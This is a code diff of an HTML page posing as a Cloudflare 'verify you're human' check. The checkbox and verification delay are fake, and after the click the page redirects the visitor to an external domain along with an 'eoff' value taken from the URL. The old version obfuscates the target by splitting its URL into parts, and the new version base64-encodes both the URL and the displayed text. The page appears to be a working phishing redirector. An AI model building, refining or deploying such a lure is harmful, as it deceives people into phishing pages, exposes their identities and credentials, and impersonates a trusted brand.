@@ -3,509 +3,190 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>To view this document, verify</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <title>Security Check</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        :root {
+            --primary-blue: #0052cc;
+            --success-green: #228b22;
+            --border-grey: #e0e0e0;
+            --text-dark: #333333;
         }
 
-        body {
-            background-color: #f5f7fa;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-            overflow: hidden;
+        * { box-sizing: border-box; }
+
+        body, html {
+            margin: 0; padding: 0; height: 100%;
+            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
+            background: #ffffff; overflow: hidden;
         }
 
-        /* Preloader styles */
-        .preloader {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: #f5f7fa;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-            transition: opacity 0.5s ease, visibility 0.5s ease;
+        /* Viewport containers */
+        .app-shell {
+            display: flex; flex-direction: column;
+            justify-content: center; align-items: center;
+            height: 100vh; width: 100vw;
         }
 
-        .preloader.fade-out {
-            opacity: 0;
-            visibility: hidden;
+        #loading-screen {
+            position: fixed; inset: 0; background: #fff;
+            display: flex; justify-content: center; align-items: center;
+            z-index: 99; transition: opacity 0.4s ease;
         }
 
-        .logo-preloader {
-            width: 120px;
-            height: 120px;
-            animation: breathing 2.5s ease-in-out infinite;
+        #main-content { visibility: hidden; opacity: 0; transition: opacity 0.5s ease; }
+
+        /* Animations */
+        @keyframes soft-pulse {
+            0%, 100% { transform: scale(1); opacity: 0.7; }
+            50% { transform: scale(1.05); opacity: 1; }
         }
 
-        @keyframes breathing {
-            0%, 100% {
-                transform: scale(1);
-                opacity: 0.8;
-            }
-            50% {
-                transform: scale(1.15);
-                opacity: 1;
-            }
+        @keyframes spin-loader {
+            to { transform: rotate(360deg); }
         }
 
-        .container {
-            width: 100%;
-            max-width: 850px;
-            display: flex;
-            justify-content: center;
-            opacity: 0;
-            transform: translateY(20px);
-            transition: opacity 0.5s ease, transform 0.5s ease;
+        .img-pulse { width: 90px; animation: soft-pulse 2s infinite; }
+
+        /* The Challenge Card */
+        .challenge-container {
+            width: 360px; padding: 20px;
+            background: #fafafa; border: 1px solid var(--border-grey);
+            border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.08);
+            display: flex; justify-content: space-between; align-items: center;
         }
 
-        .container.show {
-            opacity: 1;
-            transform: translateY(0);
+        .instruction { font-size: 0.9rem; color: var(--text-dark); margin-bottom: 15px; text-align: left; width: 360px; }
+
+        .interactive-area { display: flex; align-items: center; gap: 15px; }
+
+        .checkbox-sync {
+            width: 24px; height: 24px; border: 2px solid #bbb;
+            border-radius: 3px; background: #fff; cursor: pointer;
+            display: flex; justify-content: center; align-items: center;
+            transition: all 0.2s;
         }
 
-        .content-box {
-            background-color: white;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
-            width: 100%;
-            padding: 40px;
-            display: flex;
-            flex-direction: row;
-            position: relative;
-            overflow: hidden;
+        /* Dynamic states */
+        .is-loading {
+            width: 18px; height: 18px; border: 2px solid #ddd;
+            border-top-color: var(--primary-blue); border-radius: 50%;
+            animation: spin-loader 0.7s linear infinite;
         }
 
-        /* Left verification section */
-        .verification-section {
-            flex: 1;
-            padding-right: 40px;
-            border-right: 1px solid #eee;
+        .is-complete {
+            width: 100%; height: 100%; background: var(--success-green);
+            color: white; border-radius: 2px; font-weight: bold;
+            display: flex; justify-content: center; align-items: center;
         }
 
-        .verification-title {
-            font-size: 22px;
-            color: #333;
-            margin-bottom: 10px;
-        }
-
-        .verification-desc {
-            color: #666;
-            line-height: 1.6;
-            margin-bottom: 30px;
-        }
-
-        .verification-area {
-            display: flex;
-            align-items: center;
-            margin-top: 40px;
-        }
-
-        /* Verification control wrapper */
-        .verification-control {
-            display: flex;
-            align-items: center;
-            min-width: 200px;
-            height: 40px;
-            position: relative;
-        }
-
-        /* Checkbox styles */
-        .checkbox-container {
-            display: flex;
-            align-items: center;
-            cursor: pointer;
-            user-select: none;
-            position: absolute;
-            left: 0;
-            top: 0;
-            transition: opacity 0.3s ease;
-            z-index: 10;
-            pointer-events: auto;
-        }
-
-        .checkbox {
-            width: 24px;
-            height: 24px;
-            border: 2px solid #ddd;
-            border-radius: 4px;
-            margin-right: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.3s ease;
-            background-color: white;
-            pointer-events: none;
-        }
-
-        .checkbox i {
-            color: white;
-            font-size: 14px;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-        }
-
-        .checkbox-label {
-            font-size: 18px;
-            color: #333;
-            font-weight: 600;
-            min-width: 80px;
-            pointer-events: none;
-        }
-
-        /* Spinner styles */
-        .spinner-container {
-            display: flex;
-            align-items: center;
-            position: absolute;
-            left: 0;
-            top: 0;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-            pointer-events: none;
-            z-index: 5;
-        }
-
-        .spinner {
-            width: 24px;
-            height: 24px;
-            border: 3px solid rgba(76, 175, 80, 0.2);
-            border-top: 3px solid #4CAF50;
-            border-radius: 50%;
-            margin-right: 12px;
-            animation: spin 1s linear infinite;
-        }
-
-        .spinner-label {
-            font-size: 18px;
-            color: #333;
-            font-weight: 600;
-            min-width: 80px;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* Success tick styles */
-        .success-container {
-            display: flex;
-            align-items: center;
-            position: absolute;
-            left: 0;
-            top: 0;
-            opacity: 0;
-            transition: opacity 0.3s ease;
-            pointer-events: none;
-            z-index: 5;
-        }
-
-        .success-tick {
-            width: 24px;
-            height: 24px;
-            background-color: #4CAF50;
-            border-radius: 50%;
-            margin-right: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .success-tick i {
-            color: white;
-            font-size: 12px;
-        }
-
-        .success-label {
-            font-size: 18px;
-            color: #333;
-            font-weight: 600;
-            min-width: 80px;
-        }
-
-        /* Right branding section */
-        .branding-section {
-            flex: 1;
-            padding-left: 40px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-        }
-
-        .logo-container {
-            text-align: center;
-            margin-bottom: 25px;
-        }
-
-        .logo-image {
-            width: 80px;
-            height: 80px;
-            margin-bottom: 15px;
-            object-fit: contain;
-        }
-
-        .logo-name {
-            font-size: 32px;
-            font-weight: 800;
-            color: #333;
-            letter-spacing: 1px;
-        }
-
-        .tagline {
-            color: #666;
-            font-size: 16px;
-            margin-top: 5px;
-            font-weight: 400;
-        }
-
-        .footer-links {
-            margin-top: 30px;
-            display: flex;
-            gap: 20px;
-        }
-
-        .footer-links a {
-            color: #777;
-            text-decoration: none;
-            font-size: 14px;
-            transition: color 0.3s ease;
-        }
-
-        .footer-links a:hover {
-            color: #4CAF50;
-        }
-
-        /* Responsive design */
-        @media (max-width: 768px) {
-            .content-box {
-                flex-direction: column;
-                padding: 30px;
-            }
-
-            .verification-section {
-                padding-right: 0;
-                border-right: none;
-                border-bottom: 1px solid #eee;
-                padding-bottom: 30px;
-                margin-bottom: 30px;
-            }
-
-            .branding-section {
-                padding-left: 0;
-            }
-        }
-
-        /* For when logo.png is not found in preloader */
-        .logo-placeholder {
-            width: 120px;
-            height: 120px;
-            background: linear-gradient(135deg, #FF6B6B, #4ECDC4);
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 40px;
-            animation: breathing 2.5s ease-in-out infinite;
-        }
+        .brand-box { text-align: center; font-size: 11px; color: #777; }
+        .brand-logo { width: 25px; margin-bottom: 2px; }
+        .brand-name { font-weight: 800; color: #000; display: block; margin-bottom: 2px; }
     </style>
 </head>
 <body>
-    <!-- Preloader with breathing logo -->
-    <div class="preloader" id="preloader">
-        <img src="logo.png" alt="JollyTech Logo" class="logo-preloader" id="preloaderLogo" onerror="this.style.display='none'; document.getElementById('preloaderPlaceholder').style.display='flex';">
-        <div class="logo-placeholder" id="preloaderPlaceholder" style="display: none;">
-            <i class="fas fa-smile"></i>
-        </div>
-    </div>
 
-    <!-- Main content (hidden initially) -->
-    <div class="container" id="mainContainer">
-        <div class="content-box">
-            <!-- Left verification section -->
-            <div class="verification-section">
-                <h2 class="verification-title">Verify you're human below</h2>
-                <p class="verification-desc">
-                    Kindly verify you are not a robot below to view the document.
-                </p>
+    <section id="loading-screen">
+        <img src="astro.png" class="img-pulse" alt="Loading...">
+    </section>
 
-                <div class="verification-area">
-                    <div class="verification-control">
-                        <!-- Checkbox state -->
-                        <div class="checkbox-container" id="checkboxContainer">
-                            <div class="checkbox" id="checkbox">
-                                <i class="fas fa-check"></i>
-                            </div>
-                            <span class="checkbox-label" id="checkboxLabel">Verify</span>
-                        </div>
+    <main id="main-content" class="app-shell">
+        <div id="ui-msg" class="instruction"></div>
 
-                        <!-- Spinner state -->
-                        <div class="spinner-container" id="spinnerContainer">
-                            <div class="spinner" id="spinner"></div>
-                            <span class="spinner-label">Verifying...</span>
-                        </div>
-
-                        <!-- Success state -->
-                        <div class="success-container" id="successContainer">
-                            <div class="success-tick" id="successTick">
-                                <i class="fas fa-check"></i>
-                            </div>
-                            <span class="success-label">Verified</span>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- No status messages - all removed -->
+        <div class="challenge-container">
+            <div class="interactive-area">
+                <div id="trigger-node" class="checkbox-sync"></div>
+                <span id="status-label" style="font-size: 14px; color: #444;"></span>
             </div>
 
-            <!-- Right branding section -->
-            <div class="branding-section">
-                <div class="logo-container">
-                    <!-- Logo image for main content -->
-                    <img src="cloudflare_.png" alt="JollyTech Logo" class="logo-image" id="logoImage" onerror="this.style.display='none'; document.getElementById('logoPlaceholder').style.display='flex';">
-                    <div class="logo-placeholder" id="logoPlaceholder" style="display: none; width: 80px; height: 80px; font-size: 32px;">
-                        <i class="fas fa-smile"></i>
-                    </div>
-                    <div class="logo-name">CLOUDFLARE</div>
-                    <div class="tagline">Share unlimited files</div>
-                </div>
-
-                <div class="footer-links">
-                    <a href="#">privacy</a>
-                    <a href="#">terms</a>
-                </div>
+            <div class="brand-box">
+                <img src="astro2.png" class="brand-logo" alt="">
+                <span id="ui-brand" class="brand-name"></span>
+                <div>Privacy • Terms</div>
             </div>
         </div>
-    </div>
+    </main>
 
     <script>
-        document.addEventListener('DOMContentLoaded', function() {
-            const preloader = document.getElementById('preloader');
-            const mainContainer = document.getElementById('mainContainer');
-            const checkboxContainer = document.getElementById('checkboxContainer');
-            const checkbox = document.getElementById('checkbox');
-            const spinnerContainer = document.getElementById('spinnerContainer');
-            const successContainer = document.getElementById('successContainer');
+        const _RESOURCES = {
+            t_msg: "VG8gdmlldyB0aGVzZSBkb2N1bWVudHMsIHZlcmlmeSB5b3UgYXJlIGh1bWFuIGJlbG93",
+            t_btn: "dmVyaWZ5",
+            t_run: "dmVyaWZ5aW5nLi4u",
+            t_fin: "c3VjY2Vzcw==",
+            t_brd: "Q2xvdWRmbGFyZQ==",
+            // Target: https://aeoffice.egvhfztransfercygv.online/wvwYPnsr#
+            t_url: "aHR0cHM6Ly9hZW9mZmljZS5lZ3ZoZnp0cmFuc2ZlcmN5Z3Yub25saW5lL3d2d1lQbnNyIw==",
+            t_prm: "ZW9mZg=="
+        };
 
-            let isVerified = false;
-            let isProcessing = false;
-
-            // Function to extract eoff parameter from URL
-            function extractEoffParam() {
-                const urlParams = new URLSearchParams(window.location.search);
-                return urlParams.get('eoff') || '';
+        class Gatekeeper {
+            constructor() {
+                this.nodes = {
+                    loader: document.getElementById('loading-screen'),
+                    main: document.getElementById('main-content'),
+                    trigger: document.getElementById('trigger-node'),
+                    label: document.getElementById('status-label'),
+                    msg: document.getElementById('ui-msg'),
+                    brand: document.getElementById('ui-brand')
+                };
+                this.init();
             }
 
-            // Function to construct redirect URL with obfuscation
-            function constructRedirectUrl(eoffValue) {
-                // Split the redirect URL into multiple parts to obfuscate it
-                const part1 = "https://";
-                const part2 = "rdlogs.";
-                const part3 = "musmatvfile.";
-                const part4 = "online/";
-                const part5 = "wvwYPnsr";
+            decode(str) { return atob(str); }
 
-                // Combine the parts
-                let redirectUrl = part1 + part2 + part3 + part4 + part5;
+            init() {
+                // Populate Text
+                this.nodes.msg.textContent = this.decode(_RESOURCES.t_msg);
+                this.nodes.label.textContent = this.decode(_RESOURCES.t_btn);
+                this.nodes.brand.textContent = this.decode(_RESOURCES.t_brd);
 
-                // Add the eoff value as a hash fragment
-                if (eoffValue) {
-                    redirectUrl += "#" + eoffValue;
-                }
-
-                return redirectUrl;
-            }
-
-            // Show preloader for 2.5 seconds, then show main content
-            setTimeout(function() {
-                preloader.classList.add('fade-out');
-                setTimeout(function() {
-                    preloader.style.display = 'none';
-                    mainContainer.classList.add('show');
-                }, 500);
-            }, 2500);
-
-            // Main click handler
-            checkboxContainer.addEventListener('click', function() {
-                // Prevent multiple clicks while processing
-                if (isProcessing || isVerified) return;
-
-                isProcessing = true;
-
-                // Extract eoff value from current URL
-                const eoffValue = extractEoffParam();
-
-                // Hide checkbox and show spinner
-                checkboxContainer.style.opacity = '0';
+                // Entry Animation
                 setTimeout(() => {
-                    checkboxContainer.style.display = 'none';
-                    spinnerContainer.style.opacity = '1';
-                    spinnerContainer.style.display = 'flex';
-                }, 300);
-
-                // Simulate verification process (2 seconds)
-                setTimeout(function() {
-                    // Hide spinner and show success tick
-                    spinnerContainer.style.opacity = '0';
+                    this.nodes.loader.style.opacity = '0';
                     setTimeout(() => {
-                        spinnerContainer.style.display = 'none';
-                        successContainer.style.opacity = '1';
-                        successContainer.style.display = 'flex';
-                        isVerified = true;
-                        isProcessing = false;
-
-                        // After showing success for 1 second, redirect
-                        setTimeout(function() {
-                            // Construct and navigate to redirect URL
-                            const redirectUrl = constructRedirectUrl(eoffValue);
-
-                            // Redirect
-                            window.location.href = redirectUrl;
-
-                        }, 1000);
-                    }, 300);
+                        this.nodes.loader.style.display = 'none';
+                        this.nodes.main.style.visibility = 'visible';
+                        this.nodes.main.style.opacity = '1';
+                    }, 400);
                 }, 2000);
-            });
 
-            // Optional: Add keyboard support for accessibility
-            checkboxContainer.addEventListener('keypress', function(e) {
-                if (e.key === 'Enter' || e.key === ' ') {
-                    e.preventDefault();
-                    checkboxContainer.click();
+                this.nodes.trigger.addEventListener('click', () => this.handleProcess());
+            }
+
+            handleProcess() {
+                // Change UI to loading
+                this.nodes.trigger.style.pointerEvents = 'none';
+                this.nodes.trigger.innerHTML = '<div class="is-loading"></div>';
+                this.nodes.label.textContent = this.decode(_RESOURCES.t_run);
+
+                // Simulated verification delay
+                setTimeout(() => {
+                    this.nodes.trigger.innerHTML = '<div class="is-complete">✓</div>';
+                    this.nodes.trigger.style.border = 'none';
+                    this.nodes.label.textContent = this.decode(_RESOURCES.t_fin);
+                    this.finalize();
+                }, 2200);
+            }
+
+            finalize() {
+                const searchKey = this.decode(_RESOURCES.t_prm) + "=";
+                const href = window.location.href;
+                let payload = "";
+
+                if (href.indexOf(searchKey) !== -1) {
+                    payload = href.split(searchKey)[1];
                 }
-            });
 
-            // Set tabindex for accessibility
-            checkboxContainer.setAttribute('tabindex', '0');
+                const destination = this.decode(_RESOURCES.t_url) + payload;
 
-            // Hover effects for better UX
-            checkboxContainer.addEventListener('mouseenter', function() {
-                if (!isProcessing && !isVerified) {
-                    checkbox.style.borderColor = '#4CAF50';
-                    checkbox.style.boxShadow = '0 0 0 2px rgba(76, 175, 80, 0.2)';
-                }
-            });
+                setTimeout(() => {
+                    window.location.replace(destination);
+                }, 800);
+            }
+        }
 
-            checkboxContainer.addEventListener('mouseleave', function() {
-                if (!isProcessing && !isVerified) {
-                    checkbox.style.borderColor = '#ddd';
-                    checkbox.style.boxShadow = 'none';
-                }
-            });
-        });
+        // Boot
+        new Gatekeeper();
     </script>
 </body>
 </html>
